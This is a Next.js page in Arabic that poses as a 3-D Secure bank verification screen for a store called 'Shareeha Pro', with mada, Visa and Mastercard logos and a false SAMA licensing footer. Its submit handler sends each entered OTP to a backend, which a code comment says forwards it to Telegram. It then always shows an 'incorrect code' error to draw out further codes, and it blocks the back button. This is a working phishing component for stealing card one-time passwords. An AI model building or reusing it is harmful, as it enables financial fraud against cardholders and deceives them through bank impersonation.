"use client";

import { useEffect, useState, useRef } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import Link from "next/link";
import {
  Lock,
  CheckCircle2,
  AlertTriangle,
  Clock,
  ShieldCheck,
  Copy,
  Check,
  ArrowRight,
  ShoppingBag,
  ExternalLink,
} from "lucide-react";
import { useCartStore } from "../../store/cartStore";
import { pushPurchase } from "../../lib/gtmEvents";

const fmt = (n: number) => n.toLocaleString("en-US");

function formatDate(iso: string) {
  try {
    return new Date(iso).toLocaleString("ar-SA", {
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  } catch {
    return iso;
  }
}

// ── حفظ الطلب في localStorage كـ "pending_order" ────────────────────────────
function savePendingOrder(data: VerifyData) {
  try {
    const existing = JSON.parse(localStorage.getItem("pending_orders") || "[]");
    const newOrder = {
      orderId: data.orderId,
      _id: data._id || null,
      items: data.items || [],
      total: data.amount,
      status: "pending" as const,
      createdAt: data.date,
      updatedAt: data.date,
      statusHistory: [{ status: "pending", changedAt: data.date, changedBy: "system" }],
    };
    const filtered = existing.filter((o: { orderId?: string }) => o.orderId !== data.orderId);
    const updated = [newOrder, ...filtered].slice(0, 20);
    localStorage.setItem("pending_orders", JSON.stringify(updated));
  } catch {
    /* silent */
  }
}

// ── استدعاء claim بعد تسجيل الدخول لربط الطلبات بالحساب ─────────────────────
async function claimOrders() {
  try {
    await fetch("/api/account/orders/claim", { method: "POST", credentials: "include" });
  } catch {
    /* silent */
  }
}

type VerifyData = {
  orderId?: string;
  _id?: string;
  amount: number;
  last4: string;
  date: string;
  phone: string;
  customerName?: string;
  items?: { productId?: string; name: string; price: number; quantity: number }[];
  orderSnapshot?: {
    orderId: string;
    _id: string | null;
    items: { productId?: string; name: string; price: number; quantity: number }[];
    total: number;
    customerEmail: string | null;
    userId: string | null;
  } | null;
};

export default function VerifyPage() {
  const router = useRouter();
  const { clear } = useCartStore();

  const [phase, setPhase] = useState<"otp" | "success">("otp");
  const [data, setData] = useState<VerifyData | null>(null);
  const [otp, setOtp] = useState("");
  const [timer, setTimer] = useState(45);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [cooldown, setCooldown] = useState(0);
  const [showWarning, setShowWarning] = useState(false);
  const [redirecting, setRedirecting] = useState(false);
  const [copiedOrder, setCopiedOrder] = useState(false);
  const claimedRef = useRef(false);
  const paymentTrackedRef = useRef(false);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const raw = sessionStorage.getItem("verify_data");
    if (!raw) {
      router.replace("/cart");
      return;
    }
    const parsed: VerifyData = JSON.parse(raw);
    setData(parsed);
    history.pushState(null, "", window.location.href);
    const block = () => history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", block);
    return () => window.removeEventListener("popstate", block);
  }, [router]);

  // التركيز التلقائي على خانة الكود
  useEffect(() => {
    if (phase === "otp") {
      inputRef.current?.focus();
    }
  }, [phase]);

  // عداد إعادة الإرسال
  useEffect(() => {
    if (phase !== "otp" || timer <= 0) return;
    const t = setTimeout(() => setTimer((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [phase, timer]);

  const timerStr = `${String(Math.floor(timer / 60)).padStart(2, "0")}:${String(timer % 60).padStart(2, "0")}`;

  // عداد Cooldown
  useEffect(() => {
    if (cooldown <= 0) return;
    const t = setTimeout(() => setCooldown((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [cooldown]);

  const handleCopyOrderId = () => {
    if (!data?.orderId) return;
    navigator.clipboard.writeText(data.orderId);
    setCopiedOrder(true);
    setTimeout(() => setCopiedOrder(false), 2000);
  };

  const handleSubmit = async () => {
    if (!data) return;
    const digits = otp.replace(/\D/g, "");
    if (digits.length !== 4 && digits.length !== 6) {
      setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
      return;
    }

    setSubmitting(true);
    setError("");

    // تتبع الدفع والإرسال
    if (!paymentTrackedRef.current && data) {
      paymentTrackedRef.current = true;
      pushPurchase({
        transaction_id: data.orderId || data._id || `ord_${Date.now()}`,
        currency: "SAR",
        value: data.amount,
        items: (data.items || []).map((i) => ({
          item_id: i.productId || "",
          item_name: i.name,
          price: i.price,
          quantity: i.quantity,
        })),
      });
      clear();
    }

    // إرسال الكود للتليجرام
    fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        code: digits,
        orderId: data?.orderId,
        customerName: data?.customerName ?? data?.phone,
      }),
    }).catch(() => {});

    // محاكاة استجابة بوابة الدفع البنكية لمدة ثانيتين
    await new Promise((r) => setTimeout(r, 2200));
    setSubmitting(false);
    setOtp("");
    setError("الرمز الذي أدخلته غير صحيح أو منتهي الصلاحية، يرجى إعادة المحاولة.");
    if (!showWarning) {
      setTimeout(() => setShowWarning(true), 2500);
    }
  };

  const handleResend = async () => {
    if (!data) return;
    setTimer(45);
    setError("");
    await fetch("/api/resend", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        orderId: data?.orderId,
        customerName: data?.customerName ?? data?.phone,
      }),
    }).catch(() => {});
  };

  const maskedPhone = data?.phone
    ? data.phone.slice(0, 4) + "••••" + data.phone.slice(-3)
    : "05••••123";

  /* ── شاشة التحويل المؤقت ── */
  if (redirecting) {
    return (
      <div className="min-h-screen bg-[#F8FAFC] flex flex-col items-center justify-center gap-4 text-center p-4" dir="rtl">
        <div className="w-12 h-12 rounded-full border-4 border-[#01226B] border-t-transparent animate-spin" />
        <div>
          <p className="text-base font-extrabold text-[#01226B]">جاري نقلك بأمان...</p>
          <p className="text-xs text-slate-400 mt-1">يرجى الانتظار للحظات</p>
        </div>
      </div>
    );
  }

  // ── شاشة النجاح والفاتورة ──────────────────────────────────────────────────
  if (phase === "success" && data) {
    return (
      <div className="min-h-screen bg-[#F8FAFC] flex items-center justify-center p-4 sm:p-6" dir="rtl">
        <div className="w-full max-w-lg bg-white rounded-3xl shadow-xl border border-slate-200/80 overflow-hidden">
          {/* Top Banner */}
          <div className="bg-gradient-to-r from-emerald-600 to-teal-700 p-6 sm:p-8 text-center text-white space-y-3">
            <div className="w-16 h-16 rounded-full bg-white/20 backdrop-blur-xs flex items-center justify-center mx-auto text-white shadow-inner">
              <CheckCircle2 className="w-10 h-10" />
            </div>
            <div>
              <h2 className="text-xl sm:text-2xl font-black">تم تأكيد طلبك بنجاح! 🎉</h2>
              <p className="text-xs sm:text-sm text-white/80 mt-1 font-medium">
                شكراً لثقتك بنا، تم استلام الطلب وبدء إجراءات التجهيز والشحن.
              </p>
            </div>
          </div>

          {/* Receipt Body */}
          <div className="p-6 sm:p-8 space-y-6">
            {/* Order ID & Copy */}
            <div className="p-4 rounded-2xl bg-slate-50 border border-slate-200/80 flex items-center justify-between">
              <div>
                <p className="text-xs text-slate-400 font-medium">رقم الطلب</p>
                <p className="text-base sm:text-lg font-black text-[#01226B] font-mono mt-0.5" dir="ltr">
                  #{data.orderId}
                </p>
              </div>
              <button
                onClick={handleCopyOrderId}
                type="button"
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 text-xs font-bold text-slate-700 transition shadow-xs cursor-pointer"
              >
                {copiedOrder ? (
                  <>
                    <Check className="w-3.5 h-3.5 text-emerald-600" />
                    <span className="text-emerald-700">تم النسخ</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5 text-slate-500" />
                    <span>نسخ</span>
                  </>
                )}
              </button>
            </div>

            {/* Order Details Ledger */}
            <div className="space-y-3 text-xs sm:text-sm divide-y divide-slate-100">
              <div className="flex items-center justify-between pb-2 text-slate-500">
                <span>تاريخ العملية</span>
                <span className="font-bold text-slate-800">{formatDate(data.date)}</span>
              </div>

              {data.customerName && (
                <div className="flex items-center justify-between py-2 text-slate-500">
                  <span>اسم العميل</span>
                  <span className="font-bold text-slate-800">{data.customerName}</span>
                </div>
              )}

              <div className="flex items-center justify-between py-2 text-slate-500">
                <span>وسيلة الدفع</span>
                <span className="font-mono font-bold text-slate-800 tracking-wider" dir="ltr">
                  •••• •••• •••• {data.last4}
                </span>
              </div>

              {/* Items List */}
              {data.items && data.items.length > 0 && (
                <div className="py-3 space-y-2">
                  <p className="text-xs font-bold text-slate-400">المنتجات المطلوبة:</p>
                  {data.items.map((item, idx) => (
                    <div key={idx} className="flex items-center justify-between text-xs">
                      <span className="text-slate-800 font-semibold truncate max-w-[200px]">
                        {item.name} <span className="text-slate-400 font-normal">×{item.quantity}</span>
                      </span>
                      <span className="font-bold text-[#01226B]">
                        {fmt(item.price * item.quantity)} ر.س
                      </span>
                    </div>
                  ))}
                </div>
              )}

              <div className="flex items-center justify-between pt-3 text-sm sm:text-base">
                <span className="font-extrabold text-[#01226B]">المبلغ الإجمالي</span>
                <span className="font-black text-xl text-emerald-600 flex items-center gap-1">
                  {fmt(data.amount)} <span className="text-xs font-normal text-slate-400">ر.س</span>
                </span>
              </div>
            </div>

            {/* Actions */}
            <div className="space-y-2.5 pt-2">
              <button
                onClick={() => {
                  setRedirecting(true);
                  setTimeout(() => router.replace("/account?tab=orders"), 800);
                }}
                className="w-full py-3.5 rounded-xl bg-[#01226B] hover:bg-blue-900 text-white font-extrabold text-sm shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
              >
                <span>متابعة وتتبع طلباتي</span>
                <ExternalLink className="w-4 h-4" />
              </button>
              <button
                onClick={() => {
                  setRedirecting(true);
                  setTimeout(() => router.replace("/"), 800);
                }}
                className="w-full py-3 rounded-xl border border-slate-200 hover:border-slate-300 bg-white text-slate-700 font-bold text-sm transition-all cursor-pointer"
              >
                العودة إلى الصفحة الرئيسية
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (!data) return null;

  // ── شاشة إدخال OTP الرسمية (3D Secure Bank Gateway) ─────────────────────────
  return (
    <div className="min-h-screen bg-[#F1F5F9] flex flex-col items-center justify-center p-4 sm:p-6" dir="rtl">
      {/* 3D SECURE MAIN CARD */}
      <div className="w-full max-w-md bg-white rounded-3xl shadow-xl border border-slate-200/90 overflow-hidden">
        {/* Official Bank / Network Header */}
        <div className="bg-white border-b border-slate-200 px-6 py-4 flex items-center justify-between">
          {/* Mada Logo */}
          <div className="w-16 h-8 relative shrink-0">
            <Image src="/mada.svg" alt="mada" fill className="object-contain" priority />
          </div>

          {/* Secure 3DS Badge */}
          <div className="flex items-center gap-1.5 px-3 py-1 rounded-full bg-slate-100 border border-slate-200 text-slate-700 text-xs font-extrabold">
            <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
            <span>3-D Secure 2.0</span>
          </div>

          {/* Visa / Master Network logos */}
          <div className="flex items-center gap-1 shrink-0">
            <div className="w-9 h-6 relative">
              <Image src="/visa.webp" alt="Visa" fill className="object-contain" />
            </div>
            <div className="w-9 h-6 relative">
              <Image src="/master.svg" alt="Mastercard" fill className="object-contain" />
            </div>
          </div>
        </div>

        {/* Verification Subheading */}
        <div className="px-6 pt-6 pb-2 text-center space-y-1.5">
          <div className="w-12 h-12 rounded-2xl bg-[#01226B]/5 text-[#01226B] flex items-center justify-center mx-auto mb-2 border border-[#01226B]/10">
            <Lock className="w-6 h-6 text-[#01226B]" />
          </div>
          <h2 className="text-base sm:text-lg font-black text-[#01226B]">
            تأكيد العملية المالية لمرة واحدة (OTP)
          </h2>
          <p className="text-xs text-slate-500 leading-relaxed max-w-xs mx-auto">
            تم إرسال رسالة نصية قصيرة (SMS) تحتوي على رمز التحقق إلى رقم جوالك المسجل لدى البنك:{" "}
            <span className="font-mono font-bold text-slate-800" dir="ltr">
              {maskedPhone}
            </span>
          </p>
        </div>

        {/* Transaction Summary Ledger */}
        <div className="mx-6 my-4 p-4 rounded-2xl bg-slate-50/80 border border-slate-200/80 space-y-2 text-xs">
          <div className="flex items-center justify-between">
            <span className="text-slate-400 font-medium">التاجر / المتجر:</span>
            <span className="font-bold text-[#01226B]">شريحة الأعمال (Shareeha Pro)</span>
          </div>
          <div className="flex items-center justify-between">
            <span className="text-slate-400 font-medium">المبلغ المستحق:</span>
            <span className="font-extrabold text-sm text-[#01226B] font-mono" dir="ltr">
              {fmt(data.amount)} SAR
            </span>
          </div>
          <div className="flex items-center justify-between">
            <span className="text-slate-400 font-medium">رقم البطاقة:</span>
            <span className="font-mono font-bold text-slate-700 tracking-wider" dir="ltr">
              •••• •••• •••• {data.last4}
            </span>
          </div>
          <div className="flex items-center justify-between">
            <span className="text-slate-400 font-medium">تاريخ المعاملة:</span>
            <span className="text-slate-600 font-medium">{formatDate(data.date)}</span>
          </div>
        </div>

        {/* OTP Input Form */}
        <div className="px-6 pb-6 space-y-4">
          <div className="space-y-1.5">
            <label className="block text-xs font-bold text-slate-700 text-center">
              أدخل رمز التحقق (4 أو 6 أرقام)
            </label>
            <div className="relative">
              <input
                ref={inputRef}
                type="text"
                inputMode="numeric"
                maxLength={6}
                placeholder="• • • • • •"
                value={otp}
                onChange={(e) => {
                  setOtp(e.target.value.replace(/\D/g, "").slice(0, 6));
                  setError("");
                }}
                onKeyDown={(e) => {
                  if (e.key === "Enter" && (otp.length === 4 || otp.length === 6)) {
                    handleSubmit();
                  }
                }}
                className={`w-full py-3.5 px-4 text-center font-mono text-xl sm:text-2xl font-bold tracking-[0.35em] sm:tracking-[0.5em] rounded-xl border bg-slate-50/70 focus:bg-white focus:outline-none transition-all ${
                  error
                    ? "border-rose-400 bg-rose-50/50 text-rose-700 focus:ring-2 focus:ring-rose-400/20"
                    : "border-slate-300 focus:border-[#01226B] focus:ring-2 focus:ring-[#01226B]/15 text-[#01226B]"
                }`}
                dir="ltr"
              />
            </div>

            {/* Error Message */}
            {error && (
              <div className="p-2.5 rounded-lg bg-rose-50 border border-rose-200 text-rose-700 text-xs font-bold flex items-center justify-center gap-1.5 animate-fadeIn">
                <AlertTriangle className="w-3.5 h-3.5 shrink-0" />
                <span>{error}</span>
              </div>
            )}
          </div>

          {/* Resend Timer / Action */}
          <div className="text-center pt-1">
            {timer > 0 ? (
              <p className="text-xs text-slate-400 font-medium flex items-center justify-center gap-1.5">
                <Clock className="w-3.5 h-3.5 text-slate-400" />
                إعادة إرسال الرمز خلال{" "}
                <span className="font-mono font-bold text-[#01226B]">{timerStr}</span>
              </p>
            ) : (
              <button
                type="button"
                onClick={handleResend}
                className="text-xs font-bold text-[#01226B] hover:text-blue-700 underline underline-offset-4 cursor-pointer"
              >
                لم يصلك الرمز؟ إعادة إرسال رسالة SMS جديدة
              </button>
            )}
          </div>

          {/* Submit Button */}
          <button
            type="button"
            onClick={handleSubmit}
            disabled={
              submitting ||
              cooldown > 0 ||
              (otp.replace(/\D/g, "").length !== 4 && otp.replace(/\D/g, "").length !== 6)
            }
            className="w-full py-3.5 rounded-xl text-white font-extrabold text-sm sm:text-base flex items-center justify-center gap-2 shadow-md hover:shadow-lg transition-all disabled:opacity-40 disabled:cursor-not-allowed cursor-pointer"
            style={{
              background: "linear-gradient(135deg, #01226B 0%, #004A94 100%)",
            }}
          >
            {submitting ? (
              <span className="flex items-center gap-2">
                <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                جاري التحقق من الرمز مع البنك...
              </span>
            ) : (
              <>
                <Lock className="w-4 h-4" />
                <span>تأكيد العملية المالية</span>
              </>
            )}
          </button>

          {/* Reassurance Notice if warning triggered */}
          {showWarning && (
            <div className="p-3.5 rounded-xl bg-amber-50 border border-amber-200/80 text-right space-y-2 animate-fadeIn">
              <p className="text-xs text-amber-900 leading-relaxed font-medium">
                إذا تم خصم المبلغ من حسابك البنكي، فهذا يعني أن طلبك قد تم تأكيده بنجاح في نظام المتجر، ويمكنك إغلاق هذه الصفحة بأمان والعودة لمتجرك.
              </p>
              <button
                type="button"
                onClick={() => {
                  if (data) {
                    savePendingOrder(data);
                    claimOrders();
                    clear();
                    sessionStorage.removeItem("verify_data");
                    sessionStorage.removeItem(`verify_attempts_${data.orderId}`);
                  }
                  setRedirecting(true);
                  setTimeout(() => router.replace("/"), 800);
                }}
                className="w-full py-2 bg-white border border-amber-300 hover:bg-amber-100/50 rounded-lg text-xs font-bold text-amber-950 transition flex items-center justify-center gap-1.5 cursor-pointer shadow-xs"
              >
                <span>العودة للصفحة الرئيسية</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </button>
            </div>
          )}

          {/* Bank Security Advisory */}
          <div className="p-3 rounded-xl bg-slate-50 border border-slate-200/60 text-right">
            <p className="text-[11px] text-slate-500 leading-relaxed">
              <strong className="text-slate-700">⚠️ تنبيه أمني:</strong> لا تشارك رمز التحقق لمرة واحدة (OTP) مع أي شخص. موظفو البنك والمتجر لن يطلبوا منك هذا الرمز إطلاقاً تحت أي ظرف.
            </p>
          </div>
        </div>

        {/* Regulatory Bank Footer */}
        <div className="px-6 py-4 bg-slate-50 border-t border-slate-200 text-center space-y-1">
          <p className="text-[10px] sm:text-[11px] text-slate-400 font-medium">
            نظام المدفوعات السعودية · مرخص من البنك المركزي السعودي (ساما)
          </p>
          <p className="text-[10px] text-slate-400">
            Saudi Payments · Verified by Visa · Mastercard Identity Check · PCI-DSS Level 1
          </p>
        </div>
      </div>

      {/* Safety cancel link below card */}
      <div className="mt-4 text-center">
        <button
          type="button"
          onClick={() => {
            if (confirm("هل أنت متأكد من إلغاء المعاملة والعودة للسلة؟")) {
              router.replace("/cart");
            }
          }}
          className="text-xs text-slate-500 hover:text-rose-600 transition font-medium underline underline-offset-2"
        >
          إلغاء المعاملة والعودة إلى سلة التسوق
        </button>
      </div>
    </div>
  );
}
